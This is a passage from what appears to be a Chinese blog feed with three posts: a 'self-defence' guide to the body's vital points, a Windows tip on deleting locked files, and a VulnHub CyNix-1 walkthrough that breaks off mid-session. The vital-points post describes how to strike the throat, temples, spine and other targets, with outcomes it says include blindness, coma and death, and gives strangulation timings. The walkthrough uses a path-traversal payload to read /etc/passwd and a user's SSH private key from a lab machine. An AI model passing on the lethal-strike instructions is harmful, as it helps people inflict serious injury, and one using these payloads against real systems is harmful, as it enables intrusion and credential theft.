    <content><![CDATA[<h3 id="仅供学习防身参考使用"><a href="#仅供学习防身参考使用" class="headerlink" title="仅供学习防身参考使用"></a>仅供学习防身参考使用</h3><p>1.頭部要害及擊打方法：頭部是要害部位集中的地方，主要有十個要害區。<br>(一)耳：耳廊神經離大腦較近，受到擊打後可損傷腦膜中的動脈。擊打的穴位是面部神經主枝至耳頂端上部。擊打方法：兩手成杯狀；同時拍擊雙耳。在中國傳統武術中叫“雙峰貫耳”。掐拿耳根可會產生劇烈的酸痛感，重可令人昏厥。用掌劈擊耳根可令人立即斃命。<br>擊打後果：輕則擊穿耳膜或耳內出血，重則致腦震盪或死亡。<br>（二）太陽穴：此部位骨質脆弱。在眼角後約5厘米，向上約2.5厘米處，有一根聶頁神經，向內朝顱骨方向擊打，極容易制敵。擊打方法：用掌外側、拳、肘等擊打，用橫削掌砍擊太陽穴.如敵倒地則用足尖。<br>擊打後果：輕則腦震盪，重則死亡。<br>（三）眼睛：擊打方法：用食指，中指猛刺敵雙眼，插眼要由下至上插入，則插即中。中國傳統武術稱“雙龍取珠”。也可挖敵雙眼。<br>擊打後果：造成雙目失明，失去戰鬥力。<br>（四）鼻：擊打方法；用掌外側或拳頭橫擊鼻樑。由上而下擊打鼻骨，一擊即斷碎.<br>擊打後果； 可擊碎鼻樑骨，使敵疼痛難忍。<br>（五）上唇：此處是鼻軟骨與硬骨的連接處，神經接近皮層。<br>擊打方法：用掌的小指一側猛擊或用拳戳擊。<br>擊打後果：輕則劇痛，重則能使人昏迷。<br>（六）下巴：擊打方法；用掌根猛擊敵下巴。因為用拳很可能損傷自己的手指關節，但如果拳頭硬度不錯，用拳頭擊打，往往一招就令敵騰空而倒。勾拳擊頜下，可令人轟然倒下成腦震盪<br>擊打後果：劇痛或脫位。<br>（七）喉結：喉結處有氣管，頸動脈還有迷走神經。<br>擊打方法：用八字拳術或用掌外側硬擊，也可用手指抓捏。<br>擊打後果：輕則疼痛難忍，重則昏迷或死亡。<br>（八）咽喉：擊打方法：用手指猛戳咽喉下部的凹處。<br>擊打後果：可使敵感到劇痛，窒息。<br>（九）頸外側：擊打方法：用掌外側猛砍。<br>擊打後果：昏迷。<br>（十）頸後部：擊打方法：用掌或拳的小指一側劈砸。劈拳擊頸後枕下三角區。<br>擊打後果：可令人立即昏迷至致敵死亡。</p>
<a id="more"></a>

<p>2、軀幹要害部位及擊打方法：軀幹中有鎖骨、腋窩、腹、襠、脊椎及心、肺、脾、胃、腎等要害部位。<br>（一）鎖骨：肩部有“肩井穴”，用掌外側砍劈後，傷及“雲門”“中府”兩穴，直接擊打鎖骨，也可收到良好的效果。<br>擊打方法：用掌外側向下猛砍。<br>擊打後果；可打斷鎖骨，使其癱倒。<br>（二）腋窩：格鬥時，很少有人想到擊打這個部位。其實腋窩下有一條粗大的神經，很不經打。<br>擊打方法：敵倒地後，用腳尖猛踢。<br>擊打後果：劇痛或短暫的局部癱瘓。<br>（三）心窩；擊打方法：用尖拳猛戳，不宜用手掌或拳頭。<br>擊打後果；劇痛難忍，昏迷。<br>（四）腹部：腹部包括腹腔劍突以下肚臍以上的部位，肝、脾、腎、胃重要器官密布其中。<br>擊打方法；拳打，膝頂，肘擊，腳踢。穿透力最理想是拳指關節猛擊。<br>擊打後果；致傷，死亡。<br>（五）襠部：人體神經末梢最豐富，敏感的地方。<br>擊打方法；膝頂，腳踢，手抓。<br>擊打後果：劇痛，甚至死亡。<br>（六）腎部：擊打方法：用掌外側砍，拳打，腳踢等。<br>擊打後果；腎部致傷。可令人休克。<br>（七）肋部：最理想是擊打右肋部，因肝臟位於右肋下部，此處骨頭也最細脆，容易折斷。折斷的肋骨很容易刺破內臟。<br>擊打方法：掌砍，腳尖踢，膝頂等。<br>擊打後果：肝臟嚴重損傷，重則死亡。<br>（八）脊椎：它是人體支柱，受到擊打，極易脫位。<br>擊打方法：敵倒地後，用膝，肘，腳頂，撞，踩，部位是皮帶上方9厘米處。擊打後果：癱瘓，死亡。</p>
<p>3、四肢要害及擊打方法；四肢骨共有100多塊。施以正確的擊打方法導致脫臼、骨折或韌帶撕裂。在施用擒拿術時，對四肢關節是不能不高度重視的。<br>（一）指關節：都是單軸關節，活動範圍較小，只能伸屈，伸直時，往後或往兩側猛折會造成脫臼或骨折。<br>擊打方法；用手猛折。<br>擊打後果：骨折，脫臼。<br>（二）腕關節：腕關節有8塊腕骨，骨小易碎。<br>擊打方法：施用擒拿術時，用掌外側扣壓。<br>擊打後果：脫臼、骨折、劇痛難熬。<br>（三）肘關節：它由橈骨，尺骨和肱骨連接而成，完全伸直後，最怕從後施加壓力或擊打。<br>擊打方法；用拳或掌擊肘後部，膝蓋猛風吹草動或用小臂壓擊。<br>擊打後果：脫臼，韌帶撕裂。<br>（四）肩關節：肩關節由肩胛骨，肱骨和鎖骨連接而成，最怕左右猛擰和往後上板​​至極點。<br>擊打方法：敵倒地後，用膝頂壓或用腳猛踩。<br>擊打後果：脫臼、韌帶和肌肉撕裂。<br>（五）膝關節；膝關節由兩個關節複合而成，有臏骨，腓骨，脛骨，半月板和股骨。<br>擊打方法：伸直時，從前方，側方用腳猛力蹬踹。膝關節伸直時正面衝擊容易損傷，彎曲時側面易損傷。<br>擊打後果；脫臼或骨折，半月板破裂。<br>（六）腳背：腳背神經密布，肌肉較少，忌用腳踩。<br>擊打方法；用腳後跟猛踩，或腳尖很戳。<br>擊打後果；骨頭斷裂，劇痛難熬</p>
<p>（1）人體要害部位：咽喉<br>喉部的要害主要為咽喉和喉結。在頸部前面，兩鎖骨內側、胸骨柄上緣有一個凹陷，凹陷內有下行的無名靜脈、氣管、食管以及膈神經和迷走神經分支。氣管位於皮下最表層。這一凹陷部位通常被俗稱為咽喉，在中醫經絡學上，又被稱為“天突穴”。 “天災穴”自古被視為要害部位，少林拳法中還傳有“二捅天突穴，鎖喉致昏啞”的技擊歌訣。</p>
<p>以手指用力直戳天突穴，可以猛烈地壓迫氣管，刺激迷走神經和膈神經，引起反射性的呼吸困難和劇烈咳嗽，甚至引起窒息。肺部的迷走神經直接分佈於氣管及肺內的支氣管樹，支配著肺臟的呼吸，而膈神經則直接分佈於人體最主要的呼吸肌——膈肌的中央，支配著膈肌的運動。膈神經遭強烈刺激必然造成膈肌痙攣，引起劇烈咳嗽和呼吸困難，迷走神經遇強烈刺檄則會通過延髓的迷走神經中樞使肺的呼吸功能受到反射性的抑制，其結果，很容易導致窒息。以手指持續用力掐拿天突穴，可以使氣管、無名靜脈、迷走神經和膈神經同時受到壓迫，並可因呼吸受阻、靜脈回流受阻、腦缺氧和神經反射作用，引起窒息或昏迷。</p>
<p>打擊或掐拿天突穴，一般不會造成致命的後果，但如果咽喉被刺破，則會造成嚴重的血胸和縱膈氣腫，使大量血液流入胸腔，並使縱膈和頸部皮下發生氣腫。血胸和縱膈氣腫會壓迫肺臟和心臟，都可以在短時間使人死亡。</p>
<p>喉結在頸部正中，突出於皮下，成年男子尤為顯著。喉結上通咽和口、鼻腔，下連氣管，是肺臟與外界進行氣體交換的通氣要道。喉由軟骨構成支架，其中甲狀軟骨為最大的一塊，甲狀軟骨在頸的突出的部份即為喉結。喉結通常被人們視為要害部位。打擊喉結、扼喉、勒頸、以及銳器切頸常常被當作致命的殺傷手段。據法醫臨案統計，很多自殺或殺人者都習慣於在喉結上下切頸。</p>
<p>無論自殺或他殺，切頸者多誤認為切斷氣管或喉管便可以輕易致死。但事實上，切斷氣管僅僅縮短了呼吸道，並不能構成真正的死因。而徒手以拳、掌打擊喉結或勒頸、扼喉、壓迫喉結，卻都能致人於死地。</p>
<p>1、持續壓迫喉結可使呼吸、循環受阻<br>鎖喉、扼喉、勒頸、以掌指持續地壓迫喉結一般並不能使人立即致死，多需要經過一段時間，死亡速度比較緩慢。壓迫喉結致死，主要是由於阻斷了呼吸和阻斷了腦循環血流引起的。以掌指壓迫喉結，一般都不能使呼吸道完全阻塞。呼吸道完全被阻塞的可能性極小，只有以較細的繩索勒壓在甲狀軟骨與舌骨之間時才會發生。由於扼喉時呼吸受阻是不完全的，因而造成的窒息也是不完全的。在這種情況下致死過程就需要持續一段時間。</p>
<p>而以掌指壓迫喉結時，一般也不能完全阻斷頭、頸部的循環血流。向頭部供血的頸動脈因為有胸鎖乳突肌的覆蓋，不易被完全阻斷，深層的椎動脈受頸椎的保護，根本壓迫不到，仍能保持暢通。所以，頸部受壓時動脈供血受阻也是不完全的。只有頸靜脈回流受阻通常比較嚴重。然而頸靜脈回流受阻也不能在喉結受壓後立即形成。因此，由動脈供血不足，靜脈回流受阻引起的頭部淤血、顱內壓升高和腦缺氧也需要持續一定的時間才能真正形成。</p>
<p>無論壓迫了呼吸道使肺通氣受阻，還是壓迫了動、靜脈血管使腦循環血流受阻，都會由於腦血流中二氧化碳濃度不斷升高，氧分壓逐漸下降，引起大腦缺氧而導致死亡。在腦缺氧形成以後，腦組織仍有一定的耐受時間，一般腦缺氧1—3分鐘可使人陷入昏迷， 5—6分鐘才能使人完全死亡。腦缺氧形成以後，還會刺激頸動脈中的“化學感受裝置”，使人產生強烈的深呼吸慾望，繼而會產生窒息的恐懼心理和垂死的反抗和掙扎。在抵抗力量較大的情況下，死亡速度通常比較緩慢，一般都需要幾分鐘時間。</p>
<p>2、打擊喉結可以立即致死<br>以拳、掌打擊喉結可以立即致人於死地。這主要是由於喉結上的喉上神經和食管上的迷走神經叢受到強力刺激，致使心跳、呼吸產生反射性抑制的結果。喉上神經是迷走神經的一個分支，也是頸部皮下一個重要的感覺神經末稍。食管迷走神經叢在緊靠氣管後壁的食管上，由左右迷走神經相互交錯而成。迷走神經聯繫著延髓迷走神經中樞，對心跳、呼吸有強烈的抑製作用。強力打擊喉結，會刺激喉上神經和食管迷走神經叢產生強烈興奮，傳入延髓，引起反射性閉氣、突然窒息、心率銳減、血壓下降，甚至引起呼吸、心跳驟停而立即導致昏迷或死亡。<br>（2）劈拳擊後腦，輕則腦震盪、昏迷、重則斃命。</p>
<p><font color="red"><strong><em>切記 在最危急時才能使用 否則難逃刑責</em></strong></font></p>
]]></content>
      <categories>
        <category>搏击</category>
      </categories>
      <tags>
        <tag>肉搏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下强制删除文件或文件夹(解除文件占用/Unlock，亲测实用)</title>
    <url>/2019/12/03/force-delete/</url>
    <content><![CDATA[<p><font color="green">想必的大多玩电脑的人都有下面的经历，就是有时想删除个什么文件，或者文件夹，电脑忽然弹出文件正在被占用，删除不了的情况，然后网上搜了一堆方法，大多是，新建bat文本里面填上如下的代码：</font></p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DEL /F /A /Q \\?\%1</span><br><span class="line"></span><br><span class="line">RD /S /Q \\?\%1</span><br></pre></td></tr></table></figure>

<p><font color="green">然后将需要删除的文件拖到.bat文件上删除，但是有时候少数文件使用这种方法还是删除不了该怎么办呢？就要用到下面几种神器了，亲测有效.</font></p>
<h3 id="ProcessHacker"><a href="#ProcessHacker" class="headerlink" title="ProcessHacker"></a>ProcessHacker</h3><p>如果删除文件时，提示文件被占用，通过processhacker找到占用文件的进程。</p>
<p>在Processhacker中把占用的进程结束，然后就可以删除文件了。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2Rvd25sb2Fkcy5waHA=">ProcessHacker官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="LockHunter"><a href="#LockHunter" class="headerlink" title="LockHunter"></a>LockHunter</h3><p>推荐此软件：LockHunter - 右键解锁强制删除顽固文件(夹)，并可查看占用锁住文件的软件进程</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5pcGxheXNvZnQuY29tL2xvY2todW50ZXIuaHRtbA==">介绍<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5sb2NraHVudGVyLmNvbS9kb3dubG9hZC5odG0=">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h3><p><span class="exturl" data-url="aHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2hhbmRsZQ==">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="IObit-Unlocker"><a href="#IObit-Unlocker" class="headerlink" title="IObit Unlocker"></a>IObit Unlocker</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBsYXlzb2Z0LmNvbS9pb2JpdC11bmxvY2tlci5odG1s">IObit Unlocker - 免费实用的文件/夹强制解锁删除工具 (解决文件被占用无法删除/移动的问题)<i class="fa fa-external-link-alt"></i></span></p>
<p><strong><em>其它更多工具请自行<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8/Z3dzX3JkPXNzbA==">GOOGLE<i class="fa fa-external-link-alt"></i></span></em></strong></p>
]]></content>
      <categories>
        <category>tips</category>
      </categories>
      <tags>
        <tag>windows tips</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[CyNix-1]</title>
    <url>/2020/05/20/cynix/</url>
    <content><![CDATA[<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><font color="red">为了帮助自己更好的成长，适应国际潮流与发展。从这篇文章开始，本人以后所有的技术文章，walkthrough,writeup,及其他乱七八糟的东西，全部用英文，重要的事情强调3遍,全部用英文!全部用英文!全部用英文!以后为适应国际潮流，文章将不定期换用其它国家的语言！！！</font></p>
<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: CyNix: 1<br>Date release: 18 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MW9WOEo0bzNSOFdQMjVmbklNeTBaS2RaaS05N2VOUDZi">https://drive.google.com/open?id=1oV8J4o3R8WP25fnIMy0ZKdZi-97eNP6b<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmE=">https://download.vulnhub.com/cynix/CyNix.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9jeW5peC9DeU5peC5vdmEudG9ycmVudA==">https://download.vulnhub.com/cynix/CyNix.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Intermediate-Hard</li>
<li>User flag: user.txt</li>
<li>Root flag: root.txt</li>
<li>Description: It’s a Boot2Root machine. The machine is VirtualBox compatible but can be used in VMWare as well (not tested but it should work). The DHCP will assign an IP automatically. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively. Enjoy pwning it!</li>
</ul>
<p>We recommend that you use VirtualBox and not VMware for this VM</p>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.56.*</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.125</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p>then Get more detailed information</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -T4 -v -p- 192.168.56.125</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">6688/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6d:df:0d:37:b1:3c:86:0e:e6:6f:84:b9:28:11:ee:68 (RSA)</span><br><span class="line">|   256 8f:3e:c0:08:03:13:e8:64:89:f6:f9:63:b3:88:99:2a (ECDSA)</span><br><span class="line">|_  256 fb:e3:40:e6:91:0b:3c:bc:b7:0e:c7:bd:ef:a2:93:<span class="built_in">fc</span> (ED25519)</span><br><span class="line">MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>i use dirbuster for Web Directory scanning, get the following results</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/icons    403</span><br><span class="line">/lavalamp    200</span><br><span class="line">/server-status    403</span><br></pre></td></tr></table></figure>

<p>turn to contact page,i use burp got the following request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/</span><br><span class="line"></span><br><span class="line">name=<span class="built_in">test</span>&amp;email=ccasdcasdcas%40qq.com&amp;subject=fuckyou&amp;message=wocaonimacasdcasdcasd</span><br></pre></td></tr></table></figure>

<p>then go to </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.125/lavalamp/canyoubypassme.php</span><br></pre></td></tr></table></figure>

<p>check the source code</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;table width=<span class="string">&quot;40%&quot;</span> cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;0&quot;</span> margin=<span class="string">&quot;20%&quot;</span> class=<span class="string">&quot;tb1&quot;</span> style=<span class="string">&quot;margin:2% 30%;opacity: 0.0;&quot;</span>&gt;</span><br><span class="line">   &lt;tr&gt;&lt;td align=center style=<span class="string">&quot;padding: 3%;&quot;</span>&gt;</span><br><span class="line">    &lt;form method=post action=<span class="string">&quot;/lavalamp/canyoubypassme.php&quot;</span>&gt;Specify a number: &lt;input <span class="built_in">type</span>=text name=file placeholder=<span class="built_in">integer</span>&gt;&lt;br&gt;&lt;br&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="built_in">read</span> value=<span class="string">&quot;Download the number&quot;</span>&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>now change the opacity 0:0 to 1:0, and see what will happen</p>
<p>we got a visible form by doing that,then use burp intercept the data</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/canyoubypassme.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">file=21212&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>edit the poc to triggerthe LFI</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../etc/passwd&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>responese:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line">                &lt;div id=<span class="string">&quot;right&quot;</span>&gt;&lt;/div&gt;&lt;div align=center&gt;&lt;textarea rows=20 cols=60&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">ford:x:1000:1000:ford,,,:/home/ford:/bin/bash</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p>edit again to read ford user’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../home/ford/.ssh/id_rsa&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>and we got ford’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAk1VUtcYuZmM1Zmm4yNpguzzeocGpMVYC540yT90QqaD2Bsal</span><br><span class="line">zYqvHKEh++bOL6QTSr0NjU9ifT/lBIVSIA0TpjUTkpdIW045H+NlgMhN0q/x6Yy2</span><br><span class="line">LofuB4LQqRzr6cP0paoOYNq1KYG3QF1ouGa4k1i0td4DepBxcu4JBMOm20E7BurG</span><br><span class="line">zo41f/YWjC5DurNjIchzl4GyBClMGSXWbIbr6sYwVx2OKyiPLFLYusrNqwJNQvxz</span><br><span class="line">Mf5yolEYI8WOXJzCfiPQ5VG8KXBH3FHu+DhFNgrJQjgowD15ZMQ1qpO/2FMhewR6</span><br><span class="line">gcDs7rCLUUXc9/7uJ7e3zHlUyDgxakYohn3YiQIDAQABAoIBAE/cfSJa3mPZeuSc</span><br><span class="line">gfE9jhlwES2VD+USPljNDGyF47ZO7Y0WuGEFv43BOe6VWUYxpdNpTqM+WKCTtcwR</span><br><span class="line">iEafT/tT4dwf7LSxXf2PAUIhUS3W+UYjY80tGTUxD3Hbn3UDJuV1nH2bj3+ENJTL</span><br><span class="line">DSyHYZ1dA/dg9HnHOfeWV4UhmJxXmOAOKgU9Z73sPn4bYy4B3jnyqWn392MsQftr</span><br><span class="line">69ZYauTjku9awpuR5MAXMJ9bApk9Q7LZYwwGaSZw8ceMEUj7hkZBtP9W9cilCOdl</span><br><span class="line">rFXnkc8CvUpLh+hX6E/JOCGsUvdPuVLWKd2bgdK099GrRaenS8SlN0AUTfyNiqg4</span><br><span class="line">VE7V8AECgYEAwoGVE+Z8Tn+VD5tzQ0twK+cP2TSETkiTduYxU3rLqF8uUAc3Ye/9</span><br><span class="line">TLyfyIEvU7e+hoKltdNXHZbtGrfjVbz6gGuGehIgckHPsZCAQLPwwEqp0Jzz9eSw</span><br><span class="line">qXI0uM7n2vSdEWfCAcJBc559JKZ5uwd0XwTPNhiUqe6DUDUOZ7kI34ECgYEAwenM</span><br><span class="line">gMEaFOzr/gQsmBNyDj2gR2SuOYnOWfjUO3DDleP7yXYNTcRuy6ke1kvMhf9fWw7h</span><br><span class="line">dq3ieU0KSHrNUQ9igFK5C8FvsB+HUyEjfVpNhFppNpWUUWKDRCypbmypLg0r+9I7</span><br><span class="line">myrdBFoYv30WKVsEHus1ye4nJzKjCtkgmjYMfQkCgYA0hctcyVNt2xPEWCTC2j8b</span><br><span class="line">C9UCwSStAvoXFEfjk/gkqjcWUyyIXMbYjuLSwNen0qk3J1ZaCAyxJ8009s0DnPlD</span><br><span class="line">7kUs93IdiFnuR+fqEO0E7+R1ObzC/JMb3oQQF4cSYBV92rfPw8Xq07RVTkL21yd8</span><br><span class="line">dQ8DO5YBYS/CW+Fc7uFPgQKBgHWAVosud792UQn7PYppPhOjBBw+xdPXzVJ3lSLv</span><br><span class="line">kZSiMVBCWI1nGjwOnsD77VLFC+MBgV2IwFMAe9qvjvoveGCJv9d/v03ZzQZybi7n</span><br><span class="line">KVGp91c8DEPEjgYhigl/joR5Ns3A9p1vu72HWret9F/a5wRVQqK5zL/Tzzgjmb3Y</span><br><span class="line">QnkBAoGAVosEGOE7GzBMefGHjQGMNKfumeJ01+Av6siAI6gmXWAYBaU618XhFEh1</span><br><span class="line">+QNoLgWvSXoBuN+pMkxnRCfMTNbD1wSk46tW3sWHkZdV31gKceOifNzMVw53bJHP</span><br><span class="line">/kto0eGJ/vgM0g9eyqmcpPTVqf7EwkJdo0LngOprNyTk+54ZiUg=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>then we easily get user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># mousepad key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># chmod 700 key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125</span></span><br><span class="line">ssh: connect to host 192.168.56.125 port 22: Connection refused</span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125 -p 6688</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.125]:6688 ([192.168.56.125]:6688)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:4l9whYX6vUaC+OGLPBYRWd7sw10HKH1wJU+FcVVeJyQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.125]:6688<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"> _____  _    _  ____  ______ _   _ _______   __</span></span><br><span class="line"><span class="string">|  __ \| |  | |/ __ \|  ____| \ | |_   _\ \ / /</span></span><br><span class="line"><span class="string">| |__) | |__| | |  | | |__  |  \| | | |  \ V / </span></span><br><span class="line"><span class="string">|  ___/|  __  | |  | |  __| | . ` | | |   &gt; &lt;  </span></span><br><span class="line"><span class="string">| |    | |  | | |__| | |____| |\  |_| |_ / . \ </span></span><br><span class="line"><span class="string">|_|    |_|  |_|\____/|______|_| \_|_____/_/ \_\</span></span><br><span class="line"><span class="string">                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Nov  8 16:46:44 2019 from 10.80.3.41</span></span><br><span class="line"><span class="string">ford@blume:~$ id</span></span><br><span class="line"><span class="string">uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd)</span></span><br><span class="line"><span class="string">ford@blume:~$ whoami</span></span><br><span class="line"><span class="string">ford</span></span><br><span class="line"><span class="string">ford@blume:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">ford@blume:~$ cat user.txt</span></span><br><span class="line"><span 